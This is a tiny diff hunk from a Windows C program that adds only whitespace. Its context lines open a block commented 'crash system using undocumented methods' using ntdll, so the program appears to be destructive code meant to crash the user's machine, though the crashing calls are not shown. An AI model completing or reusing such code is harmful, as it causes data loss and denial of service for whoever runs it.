@@ -243,6 +243,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         Sleep(50);
     }
 
+    
+
     if (hNtdll != 0) { //crash system using undocumented methods
         NTSTATUS s1, s2;
         BOOLEAN b;
